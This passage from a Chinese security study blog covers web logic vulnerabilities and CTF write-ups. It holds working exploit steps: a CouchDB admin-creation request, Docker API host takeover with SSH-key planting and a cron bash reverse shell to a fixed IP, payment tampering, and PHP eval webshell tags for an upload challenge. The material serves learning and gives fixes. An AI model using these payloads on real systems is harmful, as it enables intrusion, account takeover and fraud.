tuple is found, otherwise false.//在元组TupleList列表中搜索其第n个元素比较等于Key的元组。如果找到这样的元组，则返回&#123;value, Tuple&#125;，否则返回false。\n因此，我们可以绕过所有相关的输入验证并创建一个管理员用户：\ncurl -X PUT &#x27;http://your-ip:5984/_users/org.couchdb.user:oops&#x27;--data-binary &#x27;&#123;  &quot;type&quot;: &quot;user&quot;,  &quot;name&quot;: &quot;oops&quot;,  &quot;roles&quot;: [&quot;_admin&quot;],  &quot;roles&quot;: [],  &quot;password&quot;: &quot;password&quot;&#125;&#x27;\njs解析只存储第二个值，roles为空，权限放行；但Eralang解析器将解析并存储两个值，但是在CouchDB中get_value函数只返回了jiffy所解析到的第一个键的值，即admin，管理员权限。\n注：通过查看源码，权限判断中，只要roles长度大于0就返回forbidden，只有管理员才能进行修改。\n所以此POC成功绕过js的检查，并成功被erlang解析为管理员账户。\n进入实际环境中会发生如下身份验证过程：\nJavaScript在检测时，检测我们创建的用户“角色＝０”。无角色，也就不存在权限，所以没有危害，系统判定为安全，绕过了检测。接下来在CouchDB的Erlang部分实现身份验证和授权时，jiffy实现的时候，getter函数只返回第一个值也就是&quot;roles&quot;: [“_admin”],所以创建出了具有admin权限的账户。\n开始复现\n访问首页发现是json数据\n\n接下来访问http://127.0.0.1:5984/_utils/ 发现\n\n点击验证数据库正确性，发现我们不是管理员无权操作，这样的话我们尝试直接创建一个管理员用户\n\n接下来用的是网上的poc：用put发送一个请求创建管理员的数据包\nPUT /_users/org.couchdb.user:hybcx HTTP/1.1Host: 124.220.233.26:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108&#123;&quot;type&quot;: &quot;user&quot;,&quot;name&quot;: &quot;hybcx&quot;,&quot;roles&quot;: [&quot;_admin&quot;],&quot;password&quot;: &quot;hybcx&quot;&#125;\n先用bp抓个包，其实抓不抓都无所谓，我们也可以在终端上通过curl发送put数据包\n\n接下来在bp上，输入上述poc，如下图发现我们不是管理员，无权创建管理员账户\n\n但发送包含两个roles的数据包，即可绕过限制，创建一个管理员账户，这里创建了一个账户密码皆为hybcx的管理员账户，发送如下poc\nPUT /_users/org.couchdb.user:hybcx HTTP/1.1Host: 124.220.233.26:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108&#123;&quot;type&quot;: &quot;user&quot;,&quot;name&quot;: &quot;hybcx&quot;,&quot;roles&quot;: [&quot;_admin&quot;],&quot;roles&quot;: [],&quot;password&quot;: &quot;hybcx&quot;&#125;\n\n可以看到我们成功创建，登录验证一下\n\n也是成功登陆\n漏洞修复\npatch：加入了dedupe_keys字段用于对重复键的标识，重写了make_object方法，使得jiffy解析JSON的方法和JavaScript一致。\n结论：尽量不使用多个解析器处理相同的数据。如果项目使用多种语言，不可避免发生这种情况，应该确保解析器间没有功能差异，如这里JSON 解析标准就没有指定重复键的行为。\n参考文章：https://www.cnblogs.com/qweg/p/16574127.html\n3. 未经授权访问\n漏洞介绍：即游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能\n形成原因：主要是系统设计期间没有进行全局用户身份校验；或者校验存在缺陷\n漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在\n漏洞修复：\nJ2EE中存在filter，可以获取用户的cookie等信息\n修复思路：\n建立LoginList，值是当前在线用户的id\n对所有需要登录访问到URL，获取请求request\n再利用 getAttribute(“userid”) 获取其userid\n检查userid是否存在于LoginList中，不存在则直接返回错误跳转\n值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息\nDocker daemon api未授权访问漏洞\n漏洞简介\nDocker Daemon把服务暴露在tcp的2375端口上，这样就可以在网络上操作Docker了。Docker本身没有身份认证的功能，只要网络上能访问到服务端口，就可以操作Docker。与上面的docker.sock文件利用类似。\n简单来说：该未授权访问漏洞是因为Docker API可以执行Docker命令，该接口是目的是取代Docker命令界面，通过URL操作Docker。\n环境搭建\n为了更贴近实战，所以不使用vulhub搭建docker，直接在宿主机上直接搭建。\n首先虚拟机创建一台linux（centos7版本）\n机器正常安装好docker\n接着进行文件备份（一下均是以root身份操作）\ncp /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak\n接着编辑\nvim /lib/systemd/system/docker.service\n把下面一段代码加入文件结尾\n[Service]ExecStart=ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock\n\n保存并退出编辑后，重载守护进程以及重启Docker：\nsystemctl daemon-reload`service docker restart\n通过执行命令查看是否开放了远程访问端口：\nsystemctl status docker.service\n\n如果本地搭建访问不了的话，很大原因是因为防火墙未放行2375端口，放行端口后就可以在其他机器访问到了\n如何在防火墙开启下，放行端口以至于外部可以访问添加firewall-cmd --zone=public --add-port=5005/tcp --permanent   （--permanent永久生效，没有此参数重启后失效）添加端口外部访问权限（这样外部才能访问）firewall-cmd --add-port=5005/tcp重新载入，添加端口后重新载入才能起作用firewall-cmd --reload这些之后，端口是开启成功的，如果没有成功，重启系统试试。\n漏洞检测+利用\n访问192.168.4.92:2375/version，若能访问，证明存在未授权访问漏洞。\n\n目标机：192.168.4.92\n攻击机：124.220.233.26\n写入密钥免密登陆\n在已经安装docker的vps上，使用-H参数连接目标主机的docker，使用images命令查询目标系统存在的镜像。\n\n使用docker命令创建一个容器，并将宿主机的磁盘挂载到容器中\ndocker -H tcp://192.168.4.92:2375 run -it -v /:/mnt a98b9e39cc6d /bin/bash\na98b9e39cc6d 是镜像的ID\n这条命令的意思是启动一个image ID 为a98b9e39cc6d的容器，并且将该宿主机的根目录挂在到容器的/mnt目录下\n\n如果目标机器上没有镜像就需要先pull一个镜像到目标机上。\ndocker -H tcp://192.168.4.92:2375 pull busybox\n这个镜像很小，方便下载。\n\n有镜像之后就很方便利用了。\ndocker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 /bin/bashdocker -H tcp://192.168.4.92:2375 run -it --privileged busybox  bin/sh//换成sh的原因可能是，我这里用的finalshell的ssh连接的目标机docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 sh\n启动之后就会获得该容器宿主机的shell\n\n因为我们把主机的根目录挂在到了这个容器的/mnt容器下，所以我们可以直接往主机的/root/.ssh目录下写authorized_keys\n我们将攻击机的公钥写入authorized_keys\n\n这里我之前目标机与kali都没有公钥，产生公钥可以参考文章：Linux实现ssh免密\n成功免密登陆目标服务器\nssh root@192.168.4.92\n\n写入计划任务反弹shell\n因为docker 有远程连接命令，由于2375端口暴露，可未授权访问，所以现在可以在kali上通过远程方式连接doker\n前面的操作都一致\n唯一不同的就是写的命令和路径\n有很多种写计划任务的方法\ndocker -H tcp://192.168.4.92:2375 psdocker -H tcp://192.168.4.92:2375 images\n链接进去之后，发现没有镜像文件，那么去官方下载一个镜像文件busybox\ndocker -H tcp://192.168.241.142:2375 pull busybox\n接下来启动容器，并进入 busybox 容器\ndocker -H tcp://192.168.4.92:2375 imagesdocker -H tcp://192.168.4.92:2375 run -it --privileged busybox bin/sh#在kali中启动一个有交互的shell，并且是特权镜像#当操作者执行docker run —privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。\n进入容器后，使用fdisk -l命令查看磁盘文件\n注意：在特权模式下，逃逸的方式很多，比如：直接在容器内部挂载宿主机磁盘，然后切换根目录。\n\n从返回的type信息中可以判断出，/dev/sda2是主分区，那么接下里直接在容器内部挂载宿主机磁盘\n新建一个目录：mkdir wxiaoge挂载磁盘到新建目录：mount dev/sda2 wxiaoge进入目录：cd wxiaoge/新建文件：touch wxiaoge.txt\n接下来看一下靶机中确实创建了 wxiaoge.txt 文件，docker逃逸成功\n\n接下来可以反弹主机shell\n创建 wxiao.sh 文件\nvi wxiaoge.sh\n写入反弹 shell\n#!/bin/bash#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binbash -c &quot;bash -i  &gt;&amp;/dev/tcp/192.168.4.92/55555 0&gt;&amp;1&quot;\n之后给 wxiao.sh 添加执行权限，并且写入到定时任务中\nchmod +x wxiao.sh echo &#x27;*/1 * * * *  /wxiao.sh&#x27; &gt;&gt; /wxiaoge/var/spool/cron/root#每分钟执行一次wxiaoge.sh 文件\nkali打开监听端口\n\n一分钟后成功返回 shell\n参考文章：https://www.modb.pro/db/152994\n漏洞修复：\n1.关闭2375端口 （尤其是公网情况下一定要禁用此端口）2.在防火墙上配置禁止外网访问2375端口\n2.5 图形验证码漏洞\n1. 图形验证码突破\n漏洞介绍：攻击者通过突破图形验证码的验证，可以实现如登录爆破、验证码绕过等攻击\n漏洞原理：\n图形验证码在错误后未失效\n返回验证码信息\n分步验证验证码\n漏洞点：任何存在图形验证码的功能中\n漏洞修复\n一旦验证码使用过了，必须要进行删除，重新生成验证码，可以梵高attribute中\n验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码\n验证码只需要返回图片，切勿将生成验证码的字符串也一并返回\n验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误\npikachu-on server\n测试结果：验证码有验证、无回显，但存在验证码固定（可重复使用）的设计缺陷。\n以下为验证码固定问题测试过程和源码分析。\n测试过程\n输入不正确的账户/密码及正确的验证码测试\n\n重复提交该数据包均只返回用户名或密码错误，说明存在验证码固定漏洞。\n\n所以我们可利用此漏洞绕过验证码直接对用户名和密码进行暴力破解。\n源码分析\n文件：\\vul\\burteforce\\bf_server.php\n关键代码：\n\n在用户名、密码和验证码均不为空的情况下判断输入验证码是否与生成后保存在session中的验证码相同，但比较完后没有删除该session[vcode],导致下一个数据包输入该验证码也会判断正确，出现验证码重复使用问题。\n凭借此漏洞，我们可以对用户名与密码进行爆破，验证码随意即可（但要保证该验证码是在校验页面出现过的验证码）\npikachu-on client\n测试过程\n通过查看源码发现前端JS判断验证码是否正确，所以先输入正确的验证码绕过前端判断。\n输入不正确的账户/密码及验证码进行抓包测试。\n\n由于已经绕过前端js对验证码的判断，可以将请求包中的验证码参数删除。（可以删除vcode参数）\n\n再将数据包发送到intruder对用户名和密码进行暴力破解即可。\n源码分析\n\n可以看到这里进行的前端js校验\n更多参考：https://xz.aliyun.com/t/6971#toc-20\n2.6 找回密码逻辑漏洞\n1. 密码找回漏洞\n漏洞介绍：攻击者通过密码找回逻辑漏洞，可以重置他人账号密码，危害他人账号安全\n漏洞原理：其实是验证码漏洞的一种：\n验证码时间长可爆破\n返回重置密码凭证\n若加密的重置密码凭证\n漏洞点：任何密码找回处（可延伸至相似具有验证功能） 修改接受校验码目标\n漏洞修复\n一旦验证码使用过了，必须要进行删除，重新生成验证码，可以放到attribute中\n验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码\n校验凭证不能够随着返回包进行返回\n验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误\n校验凭证的生成需要进行随机生成，防止凭证破解\n用户身份凭证和权限类漏洞修复一样，需要从attribute中获取\n登录密码重置漏洞-墨者学院\n靶场地址：https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe?spm=a2c6h.12873639.article-detail.4.6ee8b738CVQGTH\n打开靶场界面如下：\n\n1、通过“朝阳群众”的举报，证实手机号“17101304128”在系统平台从事非法集资、诈骗活动。\n2、请重置“17101304128”登录密码，以便登录获取完整的数字证据\n点击进入重置密码，来到密码重置界面\n\n已注册的手机号为18868345809\n先输入手机号17101304128，输入新密码：图形验证码，点击获取短信验证码\n\n提示：已发送至该手机，短信已发送有效期为5分钟\n再输入我已注册的手机号18868345809，设置新密码，验证码，获取验证码 得到验证码：Vxka6a\n\n\n漏洞点：他说短信已发送至该手机，可是这手机号也不是我的呀，我并不知道验证码是啥。此时就可以大胆的猜想一下，它这个网站的逻辑会不会出现问题，只是统一验证输入的验证码是否是正确的，而没有对绑定的手机号进行校验。我们可以使用刚才得到的验证码863bTV来尝试重置，成功得到key值。\n第二种做法：先用自身的账号进行密码重置流程，在得到验证码后，bp抓包修改手机号参数（换成目标手机号即可）这样同样可以的到key，两种想法都一样，只不过第二种似乎更好理解\n2.7 业务数据篡改漏洞\n1. 业务数据篡改（赋值反冲）\n漏洞介绍：攻击者通过进行数值篡改进行攻击，从而获利\n漏洞原理：\n没有对传输数据添加相关的校验参数\n后台未对参数值进行校验并直接使用数据包中的参数\n漏洞点：抽奖、购买、转账、返现等功能\n漏洞修复：\n对于软件来说，需要保护好内存数据，防止内存数据篡改\n计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改\n先校验数值，防止大整数和负数；接着利用传输的商品ID从数据库中获取商品单价重新进行价格计算；最后生成订单（订单号应为随机值）\ndami__cms-0元支付漏洞\n\n直接小p一把梭，注册登录cms看到如上页面\n点击在线充值、我要提现，看到当前余额是0\n\n点击产品展示、大米测试产品\n\n点击立即购买\n\n填写完整送货地址，将付款方式修改为站内扣款\n\n点击提交订单，同时使用burp进行抓包操作\n将qty参数修改为-1，然后点击Forward，并取消抓包\n\n\n可以看到订单已经提交成功了\n此时查看提现页面的余额已经变为6000，也就是将订单中的-6000反加到了账户余额中\n利用0元支付漏洞，在网站商城进行购买操作时，可无需支付货币，对商城造成极大危害。\n应明确业务逻辑，防止出现此情况\n\n2.8 执行顺序逻辑漏洞\n1. 执行顺序篡改\n漏洞介绍：攻击者通过篡改分步逻辑中的步骤数字，达到绕过支付、校验等效果\n漏洞原理：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付\n漏洞点：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中\n漏洞修复\n在请求最后一步时候需要带入前面的验证信息，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作\n也可以及通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验\n再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户\n2.9 其他类型逻辑漏洞\n1. 条件竞争漏洞\n漏洞介绍：可以通过同时重放大量数据包进行漏洞利用，通常用于突破限量、限额的问题都有奇效\n漏洞原理：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞\n漏洞点：程序中存在限制，可以猜测到后台有判断与修改操作的方法\n漏洞修复\n修复思路：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程\n并不是每个条件竞争都必须修复\n2. 数据包重放漏洞\n漏洞介绍：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等\n漏洞原理：后台未进行相关操作的技术导致数据包重放\n漏洞点：短信验证码、邮件校验、提交订单等功能。\n修复方案：\n修复思路（针对短信、邮件）\n构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数\n只要某个邮箱或者电话号码次数够了，就不能继续发送了\n或者计算两次发送的时间间隔，时间过短就不继续发送了\n通用修复方案\n需要建立token机制或验证码机制，一次有效\n3. 参数绑定漏洞\n漏洞介绍：通过添加对象字段相关参数进行数据篡改\n漏洞原理：对象自动绑定被许多框架支持，它允许将HTTP请求参数自动的绑定到对象，开发者没有对其进行安全校验则容易导致数据篡改\n漏洞点：常见的所有输入的地方都会出现这个漏洞，特别是金融、用户、缓存等。\n漏洞修复：Spring MVC中可以使用@InitBinder注释，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数\n这里了解一下该漏洞产生原理吧\n软件框架有时允许开发人员自动将HTTP请求参数绑定到程序变量或对象中，以使开发人员更容易使用该框架开发。这有时会造成伤害。攻击者有时可以使用这种方法来创建，修改，更新开发人员或者业务本身从未打算设计到的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象。\n因此就拿Spring MVC中的自动绑定作为举例，假设有一个用户提交基本信息的功能：\n首先看前端html：\n&lt;form action=“addUserInfo” method=&quot;post&quot;&gt;     &lt;input name=username type=text&gt;&lt;br&gt;     &lt;input name=phone type=text&gt;&lt;br&gt;     &lt;input name=email text=text&gt;&lt;br&gt;     &lt;input type=submit&gt;  &lt;/form&gt;\n很简单，一个form表单，通过post提交username，phone，email到addUserInfo。\n我们看一下用户的实体类：\npublic class User &#123;     private String userid;     private String username;     private String phone;     private String email;     private boolean isAdmin;     //Getters &amp; Setters   &#125;\n可以看到User的实体类存在除了username，phone，email还有比较重要的userid和isAdmin参数。\n我们接下来看一下controller层如果利用了自动绑定可以写出的处理方式：\n@RequestMapping(value = &quot;/addUserInfo&quot;, method = RequestMethod.POST)  public String submit(User user) &#123;     userService.add(user);     return &quot;successPage&quot;;  &#125;\n针对上述代码，给出GPT回答\n这段Java代码是一个简单的Spring MVC控制器方法，它处理HTTP POST请求并将用户信息保存到数据库中。让我们逐行来分析它：1. `@RequestMapping(value = &quot;/addUserInfo&quot;, method = RequestMethod.POST)`: 这是一个Spring MVC注解，用于将HTTP请求映射到控制器方法。在这里，它将HTTP POST请求映射到&quot;/addUserInfo&quot;路径，表示该方法将处理该路径的POST请求。2. `public String submit(User user) &#123;`: 这是控制器方法的声明，它接受一个名为&quot;User&quot;的参数。这里假设&quot;User&quot;是一个Java类，用于表示用户信息。3. `userService.add(user);`: 在这一行，代码调用一个名为&quot;userService&quot;的服务（Service）类的&quot;add&quot;方法，并传入&quot;user&quot;作为参数。这表示将用户信息保存到数据库中，可能是由&quot;userService&quot;处理数据持久化的操作。4. `return &quot;successPage&quot;;`: 最后，控制器方法返回一个字符串&quot;successPage&quot;。这通常用于将请求的处理结果返回给用户，告诉用户请求已成功处理。在这里，&quot;successPage&quot;可能是一个视图名称，它会被解析为一个实际的页面，展示给用户，用于确认操作已成功完成。总结：这段代码是一个用于处理HTTP POST请求的Spring MVC控制器方法。它接受一个&quot;user&quot;对象作为参数，将用户信息保存到数据库中，并返回一个名为&quot;successPage&quot;的字符串，用于告知用户操作已成功完成。具体的用户信息保存逻辑和&quot;successPage&quot;页面的展示取决于代码中其他部分，例如&quot;userService&quot;类和视图解析器的配置。\n潜在危害\n结合上面的demo，我们可以看到，controller层使用的自动绑定对象的方式，也就是使用了post请求的参数直接绑定到了User，虽然前端form表单中仅出现了username，phone，email，但是如果使用burp等工具向addUserInfo发送了\nPOST /addUserInfousername=daheike&amp;password=bypass&amp;email=test@test.com&amp;isAdmin=true\n或者\nPOST /addUserInfousername=daheike&amp;password=bypass&amp;email=test@test.com&amp;userid=adminid\n那么如果后续使用了被污染的对象的被污染的属性，那么就会产生一定的安全问题。\n自动绑定漏洞并非仅在Spring MVC中可能出现，只要有自动绑定功能的框架都可能出现这样的逻辑问题。\n但是可能对于大部分安全人员来说，可能面对的是一个黑盒的环境，很难发现controller层或者orm是否存在这样的问题，那么可能就需要多个表单的交叉对比，推测出可能出现问题的点了。\n修复建议\n通用修复方法是：避免将输入直接绑定到域对象，只有用户可以编辑的字段才包含在DTO中。以上文中的deom为例：\npublic class UserRegistrationFormDTO &#123;     private String username;     private String password;     private String email;     //Getters &amp; Setters   &#125;\n或者可以修改controller层，仅接收用户可以修改的参数：\n@RequestMapping(value = &quot;/addUserInfo&quot;, method = RequestMethod.POST)  public String submit(String username,String phone,String email) &#123;     userService.add(username,phone,email);     return &quot;successPage&quot;;  &#125;\n也可以设置白名单：\n@Controller  public class UserController  &#123;     @InitBinder     public void initBinder(WebDataBinder binder, WebRequest request)     &#123;        binder.setDisallowedFields([&quot;isAdmin&quot;]);     &#125;     ...  &#125;\n3.0 SRC中的逻辑漏洞总结\n1. 注册：    短信轰炸    验证码安全问题    密码爆破    邮箱轰炸2. 用户任意注册、批量注册3. 用户名枚举4. XSS（有框的地方就可以尝试插XSS）5. 登录：    短信轰炸、验证码安全问题、密码爆破、邮箱轰炸    SQL注入    撞库    抓包把password字段修改为空值发送    认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号    Cookie仿冒    修改返回包的相关数据，可能会登陆到其他的用户6. 找回密码：    短信邮箱轰炸、短信邮箱劫持    重置任意用户账户密码、验证码手机用户未统一验证    直接跳过验证步骤7. 购买支付、充值（要利用抓包去仔细查看每一个可用的参数）    交易金额、数量修改、更换支付模块（比如更换支付的模块金额）    交易信息订单编码/导致信息泄露    整数溢出，int最大值为2147483647，超过最大值    修改充值账户    支付绕过8. 抽奖活动\t刷奖品、积分\t并发9. 优惠卷、代金卷\t并发逻辑漏洞（burp批量获取优惠券）\t修改优惠券金额、数量10. 订单信息\t订单信息遍历、泄露\t订单信息泄露导致用户信息泄露\t删出他人订单11. 会员系统    修改个人信息上传文件，上传带弹窗的html    如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测    图片上传也可能遇到imagereagick命令执行，上传恶意图片    视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf    用户横向越权访问、遍历、导致用户信息泄露    SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS12. 传输过程\t明文传输账户密码\t修改信息处无session/token导致csrf\tPOST/COOKIE注入13. 评论\tPOST注入\t存储型XSS    无session/token导致CSRF1. 验证码问题\t万能验证码\t返回包中存在验证码\t删除验证码或者cookie中的值可以爆破账号密码2. \t短信轰炸    一直重放    删除修改cookie，重放数据包    遍历参数发送数据包    手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包    请求参数修改大小写，或者添加请求参数比如&amp;id=1    一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口    如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显3. 水平越权\t主要登陆后还是修改参数，主要找到多个接口不断测试\t关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测\t多个账号，主要分析请求参数4. 数据泄露\t再找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回5. 任意用户密码重置\t目前大部分都是在修改密码处参数修改\t有些是前端验证\t\t支付逻辑漏洞1. 边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户2. 顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。3. 金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包4. 确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。5. 请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。6. 请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。7. 订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。8. 欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家9. 单位替换：产生在paypal类似的国际支付的场景。10. 用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西11. 强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。12. 秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。13. 函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。14. heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。1. 修改返回包的越权修改手机号一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞2. 登录绕过部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号3. 水平越权遍历ID在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题4. ID替换如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题5. 垂直越权观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改  \n","categories":["常见top漏洞"]},{"title":"攻防世界-easyupload","url":"/2023/08/02/easyupload/","content":"题目描述：\n一名合格的黑客眼中，所有的上传点都是开发者留下的后门\n题目解题：\n这题解释长知识了（还是太菜~）\n首先毕竟是新手题目，于是自己摸索了一会儿，首先就是上传shell.php发现失败，猜测肯定是过滤了php后缀啥的，暂不考虑后缀名绕过了，这有点太小儿科了，随后bp抓包修改了php后缀发现仍然没用，那肯定就是会检测文件内容的，之后尝试了一个很正常的jpg图片，成功上传，这提示我们文件类型也得正确（这也是后续要绕过的），之后尝试了图片马，依旧错误，更加确定会检测文件内容。之后尝试特殊的文件如.htaccess文件与.usr.ini文件，前者上传失败，而后者返回如下图的信息\n\n这表明这个路线有说法，这里信息告诉我们文件类型有问题，当时只是觉得修改type类型即可，但还是会失败，然后我就知识盲区了，随后看了wp，发现这道题会检测文件头，文件头符合图片文件类型的才可以。\n开始解题\n参考wp发现：\n本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行\n这里需要绕过的点如下\n检查文件内容是否有php字符串检查后缀中是否有htaccess或ph      检查文件头部信息文件MIME类型\n对于第一点可以利用短标签绕过，例如\n这里补充一下知识：\nphp中最常见的标签为\n&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;\n不过在题目上传时可能会被waf过滤掉php关键字。根据查询结果，还有四种php的标签，分别是：\n① 仅在配置short_open_tag=on时可以使用，适合执行php语句；\n②即使配置short_open_tag=off时依然可以使用，相当于，适合输出php语句~\n上述二者的短标签都不必闭合（即?&gt;可以省略不写，也可以连接成功）~\n&lt;?  @eval($_POST['a']);?&gt;\n \n&lt;?= @eval($_POST['a']);?&gt;\n \n&lt;?  @eval($_POST['a']);\n \n&lt;?= @eval($_POST['a']);\n\n③&lt;% %&gt; 据说需要配置php.ini文件中asp_tags=on（php.ini默认状态下是关闭的），但该作者未在php.ini中找到该选项…\n④  php7及之后官方就已经不支持的写法\nphp短标签参考1：php中的短标签 太坑人了 - dongguol - 博客园 (cnblogs.com)\nphp短标签参考2：无字母数字webshell总结 - 先知社区 (aliyun.com)\n对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章\nhttps://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html\n在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。\n这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。\n其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。\n第三点绕过方式即在文件头部添加一个图片的文件头，比如GIF89a\n图片马需要在.php文件前增加文件头，上传时偶尔需要配合burpsuite抓包修改content-type，常见图片搭配格式如下表所示：\n\n\n\n文件格式\nphp 文件头\ncontent-type\n\n\n\n\n.jpg .jpe .jpeg\nJPGGraphic File\nimage/jpeg\n\n\n.png\nPNG Image File\nimage/png\n\n\n.gif\nGIF 89A\nimage/gif\n\n\n\n若题目要求上传其他格式的文件，如doc、pdf、dwg等，可以参考下面的博文：\n图片马参考1：文件头_iqiqiya的博客-CSDN博客_gif文件头\n图片马参考2：Content-type_瀚忄的博客-CSDN博客\n第四点绕过方法即修改上传时的Content-Type\n因此最终的payload为：上传.user.ini，内容为\nGIF89a                  